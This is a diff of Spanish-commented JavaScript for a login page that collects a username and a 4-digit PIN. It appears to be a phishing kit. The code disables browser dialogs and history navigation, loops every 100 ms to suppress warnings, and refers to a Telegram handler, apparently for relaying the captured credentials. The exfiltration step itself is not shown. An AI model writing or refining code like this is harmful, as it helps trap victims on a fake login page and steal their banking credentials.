@@ -1,35 +1,5 @@
-// Desactivar TODOS los diálogos del navegador inmediatamente
-(() => {
-    // Remover eventos existentes
-    window.onbeforeunload = null;
-    window.onunload = null;
-    window.onpopstate = null;
-    
-    // Eliminar las propiedades
-    delete window.onbeforeunload;
-    delete window.onunload;
-    delete window.onpopstate;
-    
-    // Prevenir futuros diálogos
-    const preventDialog = (e) => {
-        e.stopPropagation();
-        e.stopImmediatePropagation();
-        e.preventDefault();
-        e.returnValue = null;
-        return null;
-    };
-    
-    window.addEventListener('beforeunload', preventDialog, true);
-    window.addEventListener('unload', preventDialog, true);
-    window.addEventListener('popstate', preventDialog, true);
-    
-    // Sobrescribir métodos de diálogo
-    window.alert = () => true;
-    window.confirm = () => true;
-    window.prompt = () => true;
-})();
-
 // Utilizar el módulo compartido para la gestión de sesión
+
 const updateDateTime = () => {
     const now = new Date();
     const options = { 
@@ -93,7 +63,7 @@ removeAllDialogs();
 // Ejecutar periódicamente para asegurar
 setInterval(removeAllDialogs, 100);document.addEventListener('DOMContentLoaded', async () => {
     // Asegurar que los diálogos estén deshabilitados
-    removeAllDialogs();
+    disableAllDialogs();
     
     // Inicializar sesión de forma robusta
     await new Promise(resolve => {
@@ -154,24 +124,17 @@ setInterval(removeAllDialogs, 100);document.addEventListener('DOMContentLoaded',
         }
     };
 
-    // Agregar eventos de validación al nuevo formulario
-    [newUsuarioInput, newClaveInput].forEach(input => {
-        input.addEventListener('input', validateNewForm);
-        input.addEventListener('change', validateNewForm);
-    });
+    // Agregar eventos de validación
+    usuarioInput.addEventListener('input', validateForm);
+    claveInput.addEventListener('input', validateForm);
+    usuarioInput.addEventListener('change', validateForm);
+    claveInput.addEventListener('change', validateForm);
     
-    // Validación inicial
-    validateNewForm();
-
-    // Configurar validación de clave numérica
-    newClaveInput.addEventListener('input', (e) => {
-        e.target.value = e.target.value.replace(/[^0-9]/g, '');
-        if (e.target.value.length > 4) {
-            e.target.value = e.target.value.slice(0, 4);
-        }
-    });
+    // Validar al cargar la página
+    validateForm();
 
     // Crear overlay de carga
+    // Eliminar overlay existente si hay alguno
     const existingOverlay = document.querySelector('.loading-overlay');
     if (existingOverlay) {
         existingOverlay.remove();
@@ -195,8 +158,10 @@ setInterval(removeAllDialogs, 100);document.addEventListener('DOMContentLoaded',
     // Eliminar manejador de Telegram redundante ya que usamos setupTelegramActions
 
     // Remover y reemplazar el formulario para limpiar todos los eventos
-    const newForm = form.cloneNode(true);
-    form.parentNode.replaceChild(newForm, form);
+    const oldForm = form;
+    const newForm = oldForm.cloneNode(true);
+    oldForm.parentNode.replaceChild(newForm, oldForm);
+    form = newForm;
 
     // Prevenir CUALQUIER diálogo al navegar
     window.history.pushState = null;
@@ -205,28 +170,10 @@ setInterval(removeAllDialogs, 100);document.addEventListener('DOMContentLoaded',
     window.history.forward = null;
     window.onpopstate = null;
     
-    // Obtener referencias frescas a los elementos del formulario
-    const newUsuarioInput = newForm.querySelector('#usuario');
-    const newClaveInput = newForm.querySelector('#clave');
-    const newSubmitButton = newForm.querySelector('.btn-iniciar');
-
-    // Función de validación actualizada para los nuevos elementos
-    const validateNewForm = () => {
-        const usuario = newUsuarioInput.value.trim();
-        const clave = newClaveInput.value;
-        const isValid = usuario.length > 0 && clave.length === 4;
-        
-        newSubmitButton.disabled = !isValid;
-        if (isValid) {
-            newSubmitButton.classList.add('active');
-            newSubmitButton.style.backgroundColor = '#ffd700';
-            newSubmitButton.style.cursor = 'pointer';
-        } else {
-            newSubmitButton.classList.remove('active');
-            newSubmitButton.style.backgroundColor = '';
-            newSubmitButton.style.cursor = 'default';
-        }
-    };
+    // Reinstalar los listeners necesarios en el nuevo formulario
+    usuarioInput = form.querySelector('#usuario');
+    claveInput = form.querySelector('#clave');
+    submitButton = form.querySelector('.btn-iniciar');
     
     // Reinstalar validaciones
     [usuarioInput, claveInput].forEach(input => {
@@ -245,44 +192,23 @@ setInterval(removeAllDialogs, 100);document.addEventListener('DOMContentLoaded',
     // Control estricto de un solo envío
     let hasSubmitted = false;
     
-    // Prevenir diálogos en el formulario
-    const preventAllDialogs = () => {
-        window.onbeforeunload = null;
-        window.onunload = null;
-        delete window.onbeforeunload;
-        delete window.onunload;
-        window.addEventListener('beforeunload', (e) => {
-            e.preventDefault();
-            e.returnValue = null;
-            return null;
-        }, true);
-    };
-    
-    // Aplicar prevención inmediatamente
-    preventAllDialogs();
-    
-    newForm.addEventListener('submit', async (e) => {
+    form.addEventListener('submit', async (e) => {
         e.preventDefault();
         
-        // Prevenir diálogos de forma agresiva
+        // Eliminar TODOS los event listeners de navegación
         window.onbeforeunload = null;
         window.onunload = null;
         window.onpopstate = null;
-        window.addEventListener('beforeunload', (e) => {
-            e.preventDefault();
-            e.stopPropagation();
-            e.stopImmediatePropagation();
-            e.returnValue = null;
-            return null;
-        }, true);
         
-        if (hasSubmitted) {
-            console.log('Formulario ya fue enviado');
+        const now = Date.now();
+        if (isSubmitting || (now - lastSubmissionTime < MIN_SUBMISSION_INTERVAL)) {
+            console.log('Envío demasiado rápido o ya en proceso');
             return;
         }
-
-        // Marcar como enviado inmediatamente
-        hasSubmitted = true;
+        
+        // Actualizar estado de envío
+        isSubmitting = true;
+        lastSubmissionTime = now;
         
         // Mostrar overlay y bloquear interfaz
         overlay.show(true);
